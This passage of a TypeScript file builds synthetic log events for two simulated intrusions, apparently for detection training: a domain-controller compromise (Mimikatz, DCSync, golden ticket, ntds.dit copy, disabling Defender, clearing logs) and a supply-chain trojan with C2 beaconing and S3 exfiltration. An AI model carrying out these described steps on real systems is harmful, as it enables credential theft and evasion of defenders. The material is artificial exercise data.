        "source.geo.country_name": "Netherlands",
      },
    },
    proc("evt_dc_01c_userinit", 8 * SEC, userinit, "winlogon.exe started userinit.exe for it.admin's remote desktop session on SRV-NEXACORP-DC01."),
    proc("evt_dc_01d_explorer", 14 * SEC, explorer, "userinit.exe started explorer.exe for it.admin's remote desktop session on SRV-NEXACORP-DC01."),
    {
      // The tool arrives through the RDP session's drive redirection and is saved by Explorer.
      id: "evt_dc_01e_tool_written", ts: T(110 * SEC),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: dc01, user_email: adminEmail, src_ip: dc01Ip,
      severity: "medium",
      file: { path: wdPath, sha256: mimikatzHash, size: 1_245_184 },
      process: explorer,
      description: "explorer.exe wrote wdhelper.exe (1,245,184 bytes) to it.admin's AppData\\Roaming folder on SRV-NEXACORP-DC01.",
      raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": dc01, "ActionType": "FileCreated" },
    },
    proc("evt_dc_01f_cmd", 115 * SEC, cmd, "explorer.exe started cmd.exe in it.admin's session on SRV-NEXACORP-DC01."),

    // ── EVENT 2 - the tool runs, and Windows Defender detects it ────────────────
    proc("evt_dc_02a_tool_run", 2 * MIN + 40 * SEC, wd1, "cmd.exe started wdhelper.exe from it.admin's AppData\\Roaming folder with two module arguments.",
      { severity: "high", mitre_technique: "T1003.001" }),
    {
      id: "evt_dc_02_mimidetect", ts: T(3 * MIN),
      source: "av", vendor: "Microsoft Defender Antivirus", event_type: "av_detection",
      hostname: dc01, user_email: adminEmail, src_ip: dc01Ip,
      severity: "critical", mitre_technique: "T1003.001",
      file: { path: wdPath, sha256: mimikatzHash, size: 1245184 },
      description: `Windows Defender flagged HackTool:Win32/Mimikatz.A at ${wdPath} on ${dc01} and took no action.`,
      raw: {
        "event.provider": "Microsoft Defender Antivirus",
        "event.code": "1116",
        "event.action": "av_detection",
        "event.created": T(3 * MIN),
        "windefend.threat.name": "HackTool:Win32/Mimikatz.A",
        "windefend.threat.id": "2147728490",
        "windefend.threat.category": "Hacktool",
        "windefend.threat.severity": "Severe",
        "windefend.action.name": "NotBlocked",
        "windefend.action.id": "9",
        "windefend.detection.source": "Real-Time Protection",
        "windefend.detection.source_id": "3",
        "windefend.detection.type": "Concrete",
        "windefend.path": wdPath,
        "windefend.process.name": "wdhelper.exe",
        "windefend.process.pid": "4872",
        "windefend.origin": "Local machine",
        "windefend.origin_id": "1",
        "windefend.signature.version": "1.411.74.0",
        "windefend.engine.version": "1.1.24050.5",
        "file.path": wdPath,
        "file.name": "wdhelper.exe",
        "file.hash.sha256": mimikatzHash,
        "file.size": "1245184",
        "file.code_signature.exists": false, "file.code_signature.trusted": false,
        "user.name": "NEXACORP\\it.admin",
        "host.name": dc01,
        "host.ip": dc01Ip,
      },
    },

    // ── EVENT 3 - real-time protection is switched off through the registry ─────────
    proc("evt_dc_03a_reg", 5 * MIN, regExe, "cmd.exe started reg.exe to set DisableRealtimeMonitoring under the Windows Defender policy key.",
      { severity: "high", mitre_technique: "T1685" }),
    {
      id: "evt_dc_03b_reg_value", ts: T(5 * MIN + 1 * SEC),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "registry_set",
      hostname: dc01, user_email: adminEmail, src_ip: dc01Ip,
      severity: "high", mitre_technique: "T1685",
      process: regExe,
      registry: { path: "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", key: "DisableRealtimeMonitoring", value: "1" },
      description: "reg.exe set HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring to 1 on SRV-NEXACORP-DC01.",
      raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": dc01, "ActionType": "RegistryValueSet" },
    },
    {
      // Defender Operational log: Event 5007, the configuration change (old and new value).
      id: "evt_dc_03_av_disabled", ts: T(5 * MIN + 2 * SEC),
      source: "av", vendor: "Microsoft Defender Antivirus", event_type: "policy_modification",
      hostname: dc01, user_email: adminEmail,
      severity: "high", mitre_technique: "T1685",
      description: "Microsoft Defender Antivirus recorded a configuration change on SRV-NEXACORP-DC01: real-time monitoring was disabled by policy.",
      raw: {
        "event.provider": "Microsoft Defender Antivirus",
        "event.code": "5007",
        "winlog.event_id": "5007",
        "winlog.channel": "Microsoft-Windows-Windows Defender/Operational",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Windows Defender",
        "winlog.event_data.Old Value": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring = 0x0",
        "winlog.event_data.New Value": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring = 0x1",
        "host.name": dc01,
      },
    },

    // ── EVENT 4 - DCSync: replication rights exercised by a user account (Event 4662) ──
    proc("evt_dc_04a_tool_run2", 7 * MIN + 55 * SEC, wd2, "cmd.exe started wdhelper.exe from it.admin's AppData\\Roaming folder with a replication module argument against the domain.",
      { severity: "critical", mitre_technique: "T1003.006" }),
    {
      id: "evt_dc_04_dcsync_get", ts: T(8 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "privileged_operation",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.006",
      description: "it.admin, a user account, exercised DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights against the domain naming context DC=nexacorp,DC=com.",
      raw: {
        ...winHead(dc01, "4662", 2097904),
        "winlog.event_data.SubjectUserSid": adminSid,
        "winlog.event_data.SubjectUserName": "it.admin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "winlog.event_data.ObjectServer": "DS",
        "winlog.event_data.ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
        "winlog.event_data.ObjectName": "DC=nexacorp,DC=com",
        "winlog.event_data.OperationType": "Object Access",
        "winlog.event_data.AccessMask": "0x100",
        "winlog.event_data.Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
        "winlog.event_data.AdditionalInfo": "%%7688",
        "winlog.event_data.AdditionalInfo2": "-",
        "winlog.event_data.HandleId": "0x0",
        "event.action": "object-accessed",
        "event.outcome": "success",
        "user.name": "NEXACORP\\it.admin",
        "host.name": dc01,
      },
    },
    {
      // The same request touches the third replication right a DCSync client asks for (In-Filtered-Set).
      id: "evt_dc_05_dcsync_krbtgt", ts: T(8 * MIN + 1 * SEC),
      source: "ad", vendor: "Windows Security", event_type: "privileged_operation",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.006",
      description: "it.admin exercised DS-Replication-Get-Changes-In-Filtered-Set against the domain naming context DC=nexacorp,DC=com one second later.",
      raw: {
        ...winHead(dc01, "4662", 2097906),
        "winlog.event_data.SubjectUserSid": adminSid,
        "winlog.event_data.SubjectUserName": "it.admin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "winlog.event_data.ObjectServer": "DS",
        "winlog.event_data.ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
        "winlog.event_data.ObjectName": "DC=nexacorp,DC=com",
        "winlog.event_data.OperationType": "Object Access",
        "winlog.event_data.AccessMask": "0x100",
        "winlog.event_data.Properties": "{89e95b76-444d-4c62-991a-0facbeda640c}",
        "winlog.event_data.AdditionalInfo": "%%7688",
        "winlog.event_data.HandleId": "0x0",
        "event.action": "object-accessed",
        "event.outcome": "success",
        "user.name": "NEXACORP\\it.admin",
        "host.name": dc01,
      },
    },

    // ── EVENT 6 - a service ticket requested on DC02 with no TGT behind it ───────
    //
    // A golden ticket is forged OFFLINE from the krbtgt hash. The KDC never sees it minted and writes no
    // issuance record: the attacker presents the forged TGT from DC01 to get service tickets, so a 4769
    // appears with NO 4768 anywhere before it for that account. That absence is the detection.
    {
      id: "evt_dc_06_golden_kerberos", ts: T(13 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgs",
      hostname: dc02, user_email: adminEmail, src_ip: dc01Ip,
      severity: "high", mitre_technique: "T1558.001",
      description: `A service ticket for cifs/${dc02} was requested for it.admin from ${dc01} (${dc01Ip}), encrypted with RC4 (0x17).`,
      raw: {
        ...winHead(dc02, "4769", 1843190),
        // TargetUserName is the requesting principal; ServiceName is the account backing the SPN asked for.
        "winlog.event_data.TargetUserName": "it.admin@NEXACORP.COM",
        "winlog.event_data.TargetDomainName": "NEXACORP.COM",
        "winlog.event_data.ServiceName": `${dc02}$`,
        "winlog.event_data.ServiceSid": `${SID}-1108`,
        "winlog.event_data.TicketOptions": "0x40810000",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.IpAddress": dc01Ip,
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "user.name": "it.admin@NEXACORP.COM",
        "host.name": dc02,
      },
    },
    {
      id: "evt_dc_06a_mdi_alert", ts: T(14 * MIN + 10 * SEC),
      source: "ad", vendor: "Microsoft Defender for Identity", event_type: "ids_signature",
      hostname: dc02, user_email: adminEmail, src_ip: dc01Ip,
      severity: "high", is_detection: true, mitre_technique: "T1558.001",
      description: "Defender for Identity raised 'Suspected Golden Ticket usage (encryption downgrade)' for it.admin on SRV-NEXACORP-DC02: an RC4 service ticket in a domain that issues AES.",
      raw: {
        "TimeGenerated": T(14 * MIN + 10 * SEC),
        "AlertName": "Suspected Golden Ticket usage (encryption downgrade)",
        "AlertSeverity": "High",
        "ProductName": "Azure Advanced Threat Protection",
        "VendorName": "Microsoft",
        "SystemAlertId": "9d2c4f87-61b3-4e05-8a1c-5b7f0e3d2a64",
        "Status": "New",
        "StartTime": T(13 * MIN),
        "EndTime": T(13 * MIN + 5 * SEC),
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1558\"]",
        "CompromisedEntity": "it.admin",
        "Entities": JSON.stringify([
          { $id: "2", HostName: dc01, DnsDomain: "nexacorp.com", Type: "host" },
          { $id: "3", Address: dc01Ip, Type: "ip" },
          { $id: "4", Name: "it.admin", NTDomain: "NEXACORP", Type: "account" },
          { $id: "5", HostName: dc02, DnsDomain: "nexacorp.com", Type: "host" },
        ]),
        "ExtendedProperties": JSON.stringify({ "Source computer": dc01, "Source account": "it.admin", "Destination computer": dc02, "Encryption type": "RC4-HMAC (0x17)", "Domain default": "AES256", "Ticket lifetime (hours)": "87600" }),
      },
    },
    {
      // The analytic that makes the missing TGT observable (a negative cannot be seen in the feed).
      id: "evt_dc_06b_no_preceding_tgt", ts: T(14 * MIN + 30 * SEC),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: dc01, user_email: adminEmail,
      severity: "high", mitre_technique: "T1558.001", is_detection: true,
      description: "Microsoft Sentinel rule 'Kerberos service ticket requested without a prior TGT' matched for it.admin: no 4768 on any domain controller in the previous 24 hours.",
      raw: {
        "AlertName": "Kerberos service ticket requested without a prior TGT",
        "AlertSeverity": "High",
        "ProductName": "Azure Sentinel",
        "ProviderName": "ASI Scheduled Alerts",
        "AlertType": "7a1e3c58-94d2-4b60-8f17-2c6d0a9e5b31_c4f8d2a7-3e19-4a56-b0d8-91f5e7c3a246",
        "Status": "New",
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1558\"]",
        "CompromisedEntity": "it.admin",
        "ExtendedProperties.Query Period": "24:00:00",
        "ExtendedProperties.Account": "it.admin@NEXACORP.COM",
        "ExtendedProperties.Domain controllers covered": `${dc01}, ${dc02}`,
        "ExtendedProperties.4768 events in window": 0,
        "ExtendedProperties.Last 4768 for account": "2026-06-02T09:14:22Z",
        "ExtendedProperties.Domain Kerberos encryption policy": "AES256_HMAC_SHA1 (RC4 disabled 2024-03-11)",
        "Entities": JSON.stringify([
          { $id: "2", Name: "it.admin", NTDomain: "NEXACORP", Type: "account" },
          { $id: "3", HostName: dc02, DnsDomain: "nexacorp.com", Type: "host" },
        ]),
      },
    },

    // ── EVENT 7 - the forged ticket opens DC02 (network logon from DC01) ──────────
    {
      id: "evt_dc_07_lateral", ts: T(17 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dc02, user_email: adminEmail, src_ip: dc01Ip,
      severity: "high", mitre_technique: "T1550.003",
      description: `it.admin authenticated to ${dc02} via a network logon (Type 3) from ${dc01} (${dc01Ip}).`,
      raw: {
        ...winHead(dc02, "4624", 1843201),
        "winlog.event_data.SubjectUserSid": "S-1-0-0",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        "winlog.event_data.TargetUserSid": adminSid,
        "winlog.event_data.TargetUserName": "it.admin",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0xD4E5F6",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.LogonProcessName": "Kerberos",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "-",
        "winlog.event_data.IpAddress": dc01Ip,
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1842",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\it.admin",
        "host.name": dc02,
        "logon.type": "3",
        "authentication.protocol": "Kerberos",
      },
    },

    // ── EVENT 8 - ntdsutil IFM: a full copy of the AD database ────────────────
    proc("evt_dc_08_ntds", 20 * MIN, ntdsutil, "cmd.exe started ntdsutil.exe with the ifm create full verb, writing to C:\\Windows\\Temp\\ifm on SRV-NEXACORP-DC01.",
      { severity: "critical", mitre_technique: "T1003.003" }),
    {
      id: "evt_dc_08a_dit_written", ts: T(20 * MIN + 50 * SEC),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: dc01, user_email: adminEmail, src_ip: dc01Ip,
      severity: "critical", mitre_technique: "T1003.003",
      file: { path: ditPath, sha256: ntdsDitHash, size: 2_898_534_400 },
      process: ntdsutil,
      description: `ntdsutil.exe wrote ntds.dit (2.7 GB) to ${ifmDir}\\Active Directory on SRV-NEXACORP-DC01.`,
      raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": dc01, "ActionType": "FileCreated" },
    },
    {
      id: "evt_dc_08b_hive_written", ts: T(20 * MIN + 52 * SEC),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: dc01, user_email: adminEmail, src_ip: dc01Ip,
      severity: "high",
      file: { path: `${ifmDir}\\registry\\SYSTEM`, sha256: systemHiveHash, size: 18_350_080 },
      process: ntdsutil,
      description: `ntdsutil.exe wrote the SYSTEM registry hive (17.5 MB) to ${ifmDir}\\registry on SRV-NEXACORP-DC01.`,
      raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": dc01, "ActionType": "FileCreated" },
    },
    {
      id: "evt_dc_08c_edr_alert", ts: T(20 * MIN + 55 * SEC),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "edr_alert",
      hostname: dc01, user_email: adminEmail, src_ip: dc01Ip,
      severity: "critical", mitre_technique: "T1003.003", is_detection: true,
      process: ntdsutil,
      description: "Defender for Endpoint raised an alert on ntdsutil.exe creating an install-from-media copy of the Active Directory database.",
      raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": dc01, "mde.AlertTitle": "Possible attempt to access Active Directory credentials", "action_result": "detected" },
    },

    // ── EVENT 9 - shadow admin account created, then added to Domain Admins ──────
    {
      id: "evt_dc_09_shadow_admin", ts: T(23 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "account_create",
      hostname: dc01, user_email: adminEmail,
      severity: "high", mitre_technique: "T1136.001",
      description: `it.admin created a new account, ${shadowAdmin}, on ${dc01}.`,
      raw: {
        ...winHead(dc01, "4720", 2097985),
        "winlog.event_data.SubjectUserSid": adminSid,
        "winlog.event_data.SubjectUserName": "it.admin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "winlog.event_data.TargetUserName": shadowAdmin,
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetSid": `${SID}-1148`,
        "winlog.event_data.SamAccountName": shadowAdmin,
        "winlog.event_data.DisplayName": "Monitoring Service Account",
        "winlog.event_data.UserPrincipalName": `${shadowAdmin}@nexacorp.com`,
        "event.action": "user-account-created",
        "event.outcome": "success",
        "user.name": "NEXACORP\\it.admin",
        "host.name": dc01,
      },
    },
    {
      id: "evt_dc_09b_domain_admins", ts: T(23 * MIN + 20 * SEC),
      source: "ad", vendor: "Windows Security", event_type: "group_modify",
      hostname: dc01, user_email: adminEmail,
      severity: "high", mitre_technique: "T1098",
      description: `${shadowAdmin} was added to the security-enabled global group Domain Admins by it.admin.`,
      raw: {
        ...winHead(dc01, "4728", 2097992),
        "winlog.event_data.MemberName": `CN=${shadowAdmin},CN=Users,DC=nexacorp,DC=com`,
        "winlog.event_data.MemberSid": `${SID}-1148`,
        "winlog.event_data.TargetUserName": "Domain Admins",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetSid": `${SID}-512`,
        "winlog.event_data.SubjectUserSid": adminSid,
        "winlog.event_data.SubjectUserName": "it.admin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "event.action": "group-member-added",
        "event.outcome": "success",
        "user.name": "NEXACORP\\it.admin",
        "host.name": dc01,
      },
    },

    // ── EVENT 10 - Security audit log cleared (Event 1102) ──────────────────
    proc("evt_dc_10a_wevtutil", 24 * MIN + 55 * SEC, wevtutil, "cmd.exe started wevtutil.exe with the cl Security verb on SRV-NEXACORP-DC01.",
      { severity: "high", mitre_technique: "T1685.005" }),
    {
      id: "evt_dc_10_logclear", ts: T(25 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "audit_log_cleared",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1685.005",
      description: `it.admin cleared the Security event log on ${dc01} (Event 1102).`,
      raw: {
        ...winHead(dc01, "1102", 2098001),
        "winlog.provider_name": "Microsoft-Windows-Eventlog",
        "winlog.event_data.SubjectUserSid": adminSid,
        "winlog.event_data.SubjectUserName": "it.admin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "event.action": "audit-log-cleared",
        "event.outcome": "success",
        "user.name": "NEXACORP\\it.admin",
        "host.name": dc01,
        "log.name": "Security",
      },
    },

    // ── The RDP session ends: the perimeter's record of 27 minutes and what went out through it ──
    {
      id: "evt_dc_11_rdp_session_end", ts: T(27 * MIN + 5 * SEC),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      src_ip: attackerIp, src_port: 51847, dst_ip: dc01Ip, dst_port: 3389, protocol: "tcp",
      severity: "high",
      network: { bytes_out: 31_204_118, bytes_in: 2_912_663_902 },
      description: `The firewall logged the end of an inbound remote desktop session from ${attackerIp} to ${dc01} (${dc01Ip}) after 27 minutes: about 2.9 GB sent toward the client.`,
      raw: {
        "event.action": "allow",
        "source.ip": attackerIp, "destination.ip": dc01Ip, "destination.port": "3389",
        "pan.app": "ms-rdp", "pan.action": "allow", "pan.rule": "ALLOW-INBOUND-RDP",
        "pan.elapsed_time": "1623",
        "source.geo.country_name": "Netherlands",
        "network.bytes_out": "31204118", "network.bytes_in": "2912663902",
        "action_result": "allow",
      },
    },
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "Late-night admin RDP logon to a domain controller", events, T, MIN, attackerIp, dc01, dc02, adminEmail, mimikatzHash, ntdsDitHash, ditPath };
}

/** Telemetry half of `buildSupplyChainScenario`: the events and the story title, no answer key. */
export function supplyChainScenarioEvents() {
  const B = new Date("2026-06-10T14:30:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const attacker   = { ip: "185.193.127.88", relayIp: "18.141.220.50", c2Domain: "api.telemetry-cdn.net" };
  const victim     = { hostname: "prod-srv-01", ip: "10.0.1.10", adminEmail: "devops@rocketstack.io", awsAccount: "247316892041" };
  const malDllHash = makeSha256("malicious_netpulse_dll_2026");
  const agentHash  = makeSha256("netpulse_agent_4_2_1_release");
  const goodSvcHash = makeSha256("netpulse_telemetry_svc_4_2_1_release");
  const pkgHash    = makeSha256("netpulse_agent_4_2_2_linux_amd64_package");

  const HOST = victim.hostname;
  const TROJAN = "/lib/x86_64-linux-gnu/netpulse-telemetry-svc";
  const TROJAN_CMD = `${TROJAN} --config /etc/netpulse/telemetry.conf`;
  const AGENT_PID = 2214;     // netpulse-agent, started by systemd at 06:00
  const TROJAN_PID = 14882;
  const trojan = { name: "netpulse-telemetry-svc", pid: TROJAN_PID, path: TROJAN, parent_name: "netpulse-agent", parent_pid: AGENT_PID,
    cmdline: TROJAN_CMD, user: "root", hash: { sha256: malDllHash } };

  // One Falcon Linux process row.
  const proc = (id: string, t: number, p: NonNullable<TelemetryEvent["process"]>, severity: TelemetryEvent["severity"], extra: Record<string, unknown> = {},
    more: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(t), source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
    hostname: HOST, src_ip: victim.ip, severity, process: p,
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.os.type": "linux", ...extra }, ...more,
  });
  // One auditd SYSCALL record of a root daemon (no login session, so auid is unset).
  const sysc = (o: { id: string; t: number; syscall: string; pid: number; ppid: number; comm: string; exe: string; key: string; name?: string; user?: string; description: string; process: NonNullable<TelemetryEvent["process"]> }): TelemetryEvent => ({
    id: o.id, ts: T(o.t), source: "linux_audit", vendor: "Linux auditd", event_type: "privileged_operation",
    hostname: HOST, src_ip: victim.ip, severity: "medium", description: o.description, process: o.process,
    raw: {
      "data.audit.type": "SYSCALL", "data.audit.arch": "c000003e", "data.audit.syscall": o.syscall, "data.audit.success": "yes",
      "data.audit.ppid": String(o.ppid), "data.audit.pid": String(o.pid), "data.audit.auid": "4294967295", "data.audit.uid": "0", "data.audit.gid": "0",
      "data.audit.euid": "0", "data.audit.egid": "0", "data.audit.ses": "4294967295", "data.audit.tty": "(none)",
      "data.audit.comm": o.comm, "data.audit.exe": o.exe, "data.audit.key": o.key,
    },
  });
  // The PATH record of the same audit event.
  const path = (o: { id: string; t: number; eventType: TelemetryEvent["event_type"]; file: string; key: string; mode?: string; nametype?: string; description: string; process?: NonNullable<TelemetryEvent["process"]>; severity?: TelemetryEvent["severity"] }): TelemetryEvent => ({
    id: o.id, ts: T(o.t), source: "linux_audit", vendor: "Linux auditd", event_type: o.eventType,
    hostname: HOST, src_ip: victim.ip, severity: o.severity ?? "medium", description: o.description,
    ...(o.process ? { process: o.process } : {}), file: { path: o.file },
    raw: {
      "data.audit.type": "PATH", "data.audit.key": o.key, "data.audit.file.name": o.file, "data.audit.file.mode": o.mode ?? "0100600",
      "data.audit.file.ouid": "0", "data.audit.file.ogid": "0", ...(o.nametype ? { "data.audit.file.nametype": o.nametype } : {}),
    },
  });

  // C2 beacon: ~45 s with jitter, one TLS session per beat. The sensor, the firewall and DNS all see it.
  const beats = [0, 46, 89, 136, 180, 227].map(s => s * SEC);
  const ports = [52341, 52377, 52402, 52458, 52493, 52530];
  const beatEvents: TelemetryEvent[] = beats.flatMap((off, i): TelemetryEvent[] => {
    const t = 8 * MIN + off;
    return [
      {
        id: `evt_sc_04a_c2_connect_${i + 1}`, ts: T(t), source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
        hostname: HOST, src_ip: victim.ip, dst_ip: attacker.ip, src_port: ports[i], dst_port: 443, protocol: "tcp",
        severity: "medium", process: trojan, network: { domain: attacker.c2Domain },
        description: `netpulse-telemetry-svc opened an outbound TLS session from port ${ports[i]} to ${attacker.ip}:443.`,
        raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "host.os.type": "linux" },
      },
      {
        id: i === 0 ? "evt_sc_04_c2_beacon" : `evt_sc_04_c2_beacon_${i + 1}`, ts: T(t + 120), source: "firewall", vendor: "FortiGate", event_type: "net_connection",
        hostname: HOST, src_ip: victim.ip, dst_ip: attacker.ip, src_port: ports[i], dst_port: 443, protocol: "tcp",
        severity: "medium", ...(i === 0 ? { mitre_technique: "T1071.001" } : {}),
        description: `prod-srv-01 sent a ${1024 + (i % 2) * 8}-byte HTTPS request from port ${ports[i]} to ${attacker.ip} (Netherlands); beat ${i + 1} of the 45-second pattern.`,
        network: { bytes_in: 4096 + i * 16, bytes_out: 1024 + (i % 2) * 8 },
        raw: {
          "data.type": "traffic", "data.subtype": "forward", "data.action": "close",
          "data.srcip": victim.ip, "data.dstip": attacker.ip, "data.srcport": String(ports[i]), "data.dstport": "443", "data.proto": "6",
          "data.app": "HTTPS", "data.dstcountry": "Netherlands", "data.sentbyte": 1024 + (i % 2) * 8, "data.rcvdbyte": 4096 + i * 16, "data.duration": 1,
          "data.vd": "root", "data.logdesc": "Traffic Statistics",
        },
      },
    ];
  });

  const exfilObjects: { key: string; bytes: number }[] = [
    { key: "backups/2026-06-10/pg_dump_prod.sql.gz", bytes: 804_300_000 },
    { key: "backups/2026-06-09/pg_dump_prod.sql.gz", bytes: 798_100_000 },
    { key: "customers/pii_export_2026-06.csv", bytes: 412_700_000 },
    { key: "customers/pii_export_2026-05.csv", bytes: 196_400_000 },
    { key: "src/rocketstack-api-2026-06-10.tar.gz", bytes: 58_900_000 },
    { key: "src/rocketstack-web-2026-06-10.tar.gz", bytes: 31_600_000 },
    { key: "backups/config/jenkins-home-2026-06-10.tar.gz", bytes: 15_300_000 },
    { key: "customers/contracts-index-2026-06.csv", bytes: 8_700_000 },
    { key: "backups/config/terraform-state-2026-06-10.tfstate.gz", bytes: 4_200_000 },
  ];
  const UA = "aws-cli/2.17.60 md/awscrt#0.21.2 ua/2.0 os/linux#5.15.0 lang/python#3.11.4";
  const roleSession = `arn:aws:sts::${victim.awsAccount}:assumed-role/rocketstack-prod-deploy/devops-ci`;
  const asRole = (extra: Record<string, unknown>): Record<string, unknown> => ({
    "aws.cloudtrail.sourceIPAddress": attacker.relayIp, "aws.cloudtrail.userAgent": UA, "aws.cloudtrail.awsRegion": "eu-west-1",
    "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": roleSession,
    "aws.cloudtrail.userIdentity.accountId": victim.awsAccount, "GeoLocation.country_name": "Singapore", ...extra,
  });
  const exfilEvents: TelemetryEvent[] = exfilObjects.map((o, i): TelemetryEvent => ({
    id: `evt_sc_10_s3_exfil_${String(i + 1).padStart(2, "0")}`, ts: T(28 * MIN + i * 20 * SEC),
    source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_storage_access",
    src_ip: attacker.relayIp, severity: "high", ...(i === 0 ? { mitre_technique: "T1530" } : {}),
    description: `GetObject on s3://rocketstack-prod-backups/${o.key} (${o.bytes.toLocaleString("en-US")} bytes) from ${attacker.relayIp}.`,
    cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "eu-west-1", resource: "rocketstack-prod-backups" },
    network: { bytes_out: o.bytes },
    raw: asRole({
      "aws.cloudtrail.eventName": "GetObject", "aws.cloudtrail.eventSource": "s3.amazonaws.com",
      "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-backups", "aws.cloudtrail.requestParameters.key": o.key,
    }),
  }));

  const events: TelemetryEvent[] = [
    // ── Baseline: how NetPulse looked before the update (known-good agent, vendor path, vendor hash) ──
    proc("evt_sc_00a_baseline_agent_start", -8 * 60 * MIN - 30 * MIN, {
      name: "netpulse-agent", pid: AGENT_PID, path: "/usr/lib/netpulse/netpulse-agent", parent_name: "systemd", parent_pid: 1,
      cmdline: "/usr/lib/netpulse/netpulse-agent --daemon --config /etc/netpulse/agent.conf", user: "root", hash: { sha256: agentHash },
    }, "informational", { "process.code_signature.exists": true, "process.code_signature.trusted": true, "process.code_signature.subject_name": "NetPulse Solutions Inc." },
    { is_baseline: true, expected_verdict: "informational",
      description: "netpulse-agent 4.2.1 started by systemd on prod-srv-01 from the vendor path /usr/lib/netpulse/, a signed binary with the vendor's hash." }),
    proc("evt_sc_00b_baseline_collector_run", -8 * 60 * MIN - 29 * MIN - 50 * SEC, {
      name: "netpulse-collector", pid: 2231, path: "/usr/lib/netpulse/netpulse-collector", parent_name: "netpulse-agent", parent_pid: AGENT_PID,
      cmdline: "/usr/lib/netpulse/netpulse-collector --config /etc/netpulse/collector.conf", user: "root", hash: { sha256: goodSvcHash },
    }, "informational", { "process.code_signature.exists": true, "process.code_signature.trusted": true, "process.code_signature.subject_name": "NetPulse Solutions Inc." },
    { is_baseline: true, expected_verdict: "informational",
      description: "Before the update, netpulse-agent started its metrics collector, netpulse-collector, from /usr/lib/netpulse/ with the vendor's hash." }),

    // ── The update arrives through the approved channel ──
    {
      id: "evt_sc_01a_dns_update", ts: T(-2 * SEC), source: "dns", vendor: "Infoblox DNS", event_type: "dns_query",
      hostname: HOST, src_ip: victim.ip, dst_ip: "10.0.0.10", dst_port: 53, protocol: "udp", severity: "informational",
      dns: { query: "updates.netpulse.io", query_type: "A", response: "104.18.22.195", rcode: "NOERROR" },
      description: "prod-srv-01 resolved updates.netpulse.io, the vendor's update host.",
      raw: { "infoblox.client_ip": victim.ip, "infoblox.query_name": "updates.netpulse.io", "infoblox.query_type": "A", "infoblox.rcode": "NOERROR", "infoblox.answer": "104.18.22.195", "infoblox.ttl": 300 },
    },
    {
